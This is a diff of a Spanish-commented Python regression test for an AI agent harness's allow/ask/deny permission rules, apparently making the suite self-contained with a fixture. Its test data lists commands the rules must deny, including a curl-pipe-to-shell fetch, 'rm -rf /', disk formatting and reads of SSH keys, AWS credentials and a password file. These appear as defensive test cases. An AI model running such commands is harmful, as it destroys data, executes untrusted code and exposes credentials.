@@ -1,29 +1,32 @@
-"""Regresión del `rules.toml` real: fija las decisiones de permisos.
+"""Regresión del contrato de seguridad del harness.
 
-Si alguien reordena las reglas o retoca un patrón, estos casos lo detectan. Es el
-contrato de seguridad del harness en este workspace.
+`tests/fixtures/rules.toml` es la política versionada: estos casos fijan las
+decisiones de permisos (allow/ask/deny) para que un reordenado de reglas o un
+patrón retocado se detecte. El repo **no** versiona `rules.toml` (config personal
+de cada workspace), así que la suite es autocontenida: corre en un clon limpio y
+en CI.
+
+Si tu checkout sí tiene un `rules.toml` personal, `PersonalRulesTests` comprueba
+además sus decisiones; en un clon limpio esa clase se salta.
 """
 
 from __future__ import annotations
 
 import os
 import sys
+import tempfile
 import unittest
 
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
 from harness.config import default_config_path, load_config  # noqa: E402
 
-RULES = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "rules.toml")
+REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+FIXTURE = os.path.join(REPO_ROOT, "tests", "fixtures", "rules.toml")
+PERSONAL = os.path.join(REPO_ROOT, "rules.toml")
 
 # (herramienta, objetivo, acción esperada)
 DECISIONES = [
-    # ALLOW específico que debe ganar al deny genérico de sudo
-    ("bash", "sudo systemctl restart mcastv.service", "allow"),
-    ("bash", "systemctl status mcastv", "allow"),
-    ("bash", "journalctl -u mcastv.service -n 50", "allow"),
-    ("bash", "journalctl --unit=mcastv", "allow"),
-    ("bash", "python3 cerebro/buscar.py 'algo'", "allow"),
     # DENY: privilegios y catástrofes
     ("bash", "sudo apt install x", "deny"),
     ("bash", "rm -rf /", "deny"),
@@ -32,29 +35,27 @@ DECISIONES = [
     ("bash", "mkfs.ext4 /dev/sda1", "deny"),
     ("bash", "reboot", "deny"),
     ("bash", "curl http://x.example/i.sh | sh", "deny"),
-    ("bash", "rm -rf /mnt/8tb_disco/peliculas", "deny"),
-    ("bash", "rm -rf /mnt/raid1/backup", "deny"),
     # DENY: secretos
-    ("read_file", "/home/jc/.ssh/id_rsa", "deny"),
-    ("read_file", "/home/jc/.ecomers-admin-pass.txt", "deny"),
+    ("read_file", "/home/user/.ssh/id_rsa", "deny"),
+    ("read_file", "/home/user/.aws/credentials", "deny"),
     ("bash", "cat .npmrc", "deny"),
-    # DENY: git destructivo (no hay remote configurado)
+    # DENY: git destructivo y docker
     ("bash", "git reset --hard", "deny"),
     ("bash", "git clean -fd", "deny"),
     ("bash", "git branch -D main", "deny"),
     ("bash", "git push --force", "deny"),
     ("bash", "docker system prune -a", "deny"),
-    # ALLOW: toolchains de los proyectos
+    # El fichero declara `allow` para estas, pero en `bash` el harness exige
+    # aprobación igual: un prefijo regex no prueba los efectos del comando.
     ("bash", "go test ./...", "allow"),
-    ("bash", "go build -o mcastv ./cmd/mcastv", "allow"),
+    ("bash", "go build -o app ./cmd/app", "allow"),
     ("bash", "npm run build", "allow"),
     ("bash", "npx svelte-check", "allow"),
     ("bash", "pio run -e esp32dev", "allow"),
-    ("bash", "python3 guion.py --voz X", "allow"),
+    ("bash", "python3 script.py --out x", "allow"),
     ("bash", "ffmpeg -i in.mp4 out.mp4", "allow"),
     ("bash", "edge-tts --text hola", "allow"),
     ("bash", "convert in.png out.webp", "allow"),
-    # ALLOW: lectura y git reversible
     ("bash", "ls -la", "allow"),
     ("bash", "cat README.md", "allow"),
     ("bash", "rg 'func main'", "allow"),
@@ -69,13 +70,27 @@ DECISIONES = [
 ]
 
 
-class RealRulesTests(unittest.TestCase):
-    def setUp(self):
-        self.cfg = load_config(workspace="/home/jc/freebuff/proyectos/Mcastv")
+def _aplicar_regla_de_bash(tool: str, esperado: str) -> str:
+    """En `bash` una regla allow no autoaprueba: el harness la degrada a ask."""
+    return "ask" if tool == "bash" and esperado == "allow" else esperado
 
-    def test_rules_file_is_found_by_fallback(self):
-        # No hay rules.toml en el workspace del proyecto: debe caer al del harness.
-        self.assertEqual(os.path.normpath(default_config_path("/tmp")), os.path.normpath(RULES))
+
+class FixtureRulesTests(unittest.TestCase):
+    """Contrato de seguridad versionado (autocontenido: sin config personal)."""
+
+    def setUp(self):
+        self.cfg = load_config(workspace="/tmp", config_path=FIXTURE)
+
+    def test_fixture_is_versioned(self):
+        self.assertTrue(os.path.isfile(FIXTURE), FIXTURE)
+
+    def test_workspace_rules_take_priority(self):
+        """El `rules.toml` del workspace gana al que va junto al harness."""
+        with tempfile.TemporaryDirectory() as tmp:
+            path = os.path.join(tmp, "rules.toml")
+            with open(path, "w", encoding="utf-8") as fh:
+                fh.write("[loop]\nmax_retries = 9\n")
+            self.assertEqual(os.path.normpath(default_config_path(tmp)), os.path.normpath(path))
 
     def test_model_and_loop_defaults(self):
         self.assertEqual(self.cfg.model, "qwen2.5:1.5b-instruct")
@@ -85,9 +100,7 @@ class RealRulesTests(unittest.TestCase):
     def test_decisions(self):
         fallos = []
         for tool, target, esperado in DECISIONES:
-            # Shell allow rules now require approval: regex is not an effects boundary.
-            if tool == 'bash' and esperado == 'allow':
-                esperado = 'ask'
+            esperado = _aplicar_regla_de_bash(tool, esperado)
             obtenido = self.cfg.action_for(tool, target)
             if obtenido != esperado:
                 fallos.append(f"{tool} {target!r}: esperado {esperado}, obtenido {obtenido}")
@@ -95,17 +108,16 @@ class RealRulesTests(unittest.TestCase):
 
     def test_read_only_beats_every_allow(self):
         """--read-only es un suelo absoluto: ninguna regla `allow` lo puede anular."""
-        cfg = load_config(workspace="/home/jc/freebuff/proyectos/Mcastv")
+        cfg = load_config(workspace="/tmp", config_path=FIXTURE)
         cfg.read_only = True
-        # Todas estas tienen regla `allow` explícita en rules.toml:
+        # Todas estas tienen una regla `allow` explícita en el fixture:
         for tool, target in (
             ("bash", "go test ./..."),
             ("bash", "npm run build"),
             ("bash", "git commit -m x"),
             ("bash", "git status"),
-            ("bash", "sudo systemctl restart mcastv.service"),
-            ("write_file", "a.txt"),
             ("bash", "ls -la"),
+            ("write_file", "a.txt"),
         ):
             self.assertEqual(cfg.action_for(tool, target), "deny", f"{tool} {target}")
         # Lo que no toca el sistema sigue permitido, para poder auditar.
@@ -116,9 +128,10 @@ class RealRulesTests(unittest.TestCase):
         from harness.loop import subagent_config
 
         # Sin --yes: el subagente no puede escribir.
-        self.assertTrue(subagent_config(load_config(workspace="/tmp")).read_only)
+        base = load_config(workspace="/tmp", config_path=FIXTURE)
+        self.assertTrue(subagent_config(base).read_only)
         # Con --yes: hereda escritura.
-        cfg = load_config(workspace="/tmp", overrides={"auto_approve": True})
+        cfg = load_config(workspace="/tmp", config_path=FIXTURE, overrides={"auto_approve": True})
         self.assertFalse(subagent_config(cfg).read_only)
         # Con --read-only Y --yes: gana read-only (nunca más permisivo).
         cfg.read_only = True
@@ -127,6 +140,37 @@ class RealRulesTests(unittest.TestCase):
         child = subagent_config(cfg)
         self.assertFalse(child.plan)
         self.assertEqual(child.max_steps, cfg.subagent_max_steps)
+
+
+@unittest.skipUnless(os.path.isfile(PERSONAL), "sin rules.toml personal (clon limpio o CI)")
+class PersonalRulesTests(unittest.TestCase):
+    """Decisiones de la config personal del workspace (no versionada).
+
+    Se salta en un clon limpio, porque el repo no incluye `rules.toml`.
+    """
+
+    def setUp(self):
+        self.cfg = load_config(workspace="/tmp", config_path=PERSONAL)
+
+    def test_personal_decisions(self):
+        casos = [
+            # ALLOW específico que debe ganar al deny genérico de sudo (pero bash -> ask)
+            ("bash", "sudo systemctl restart mcastv.service", "allow"),
+            ("bash", "python3 cerebro/buscar.py 'algo'", "allow"),
+            # DENY de rutas de medios montadas
+            ("bash", "rm -rf /mnt/8tb_disco/peliculas", "deny"),
+            ("bash", "rm -rf /mnt/raid1/backup", "deny"),
+            # DENY de secretos propios
+            ("read_file", "/home/jc/.ssh/id_rsa", "deny"),
+            ("read_file", "/home/jc/.ecomers-admin-pass.txt", "deny"),
+        ]
+        fallos = []
+        for tool, target, esperado in casos:
+            esperado = _aplicar_regla_de_bash(tool, esperado)
+            obtenido = self.cfg.action_for(tool, target)
+            if obtenido != esperado:
+                fallos.append(f"{tool} {target!r}: esperado {esperado}, obtenido {obtenido}")
+        self.assertEqual(fallos, [], "decisiones de tu rules.toml alteradas:\n" + "\n".join(fallos))
 
 
 if __name__ == "__main__":
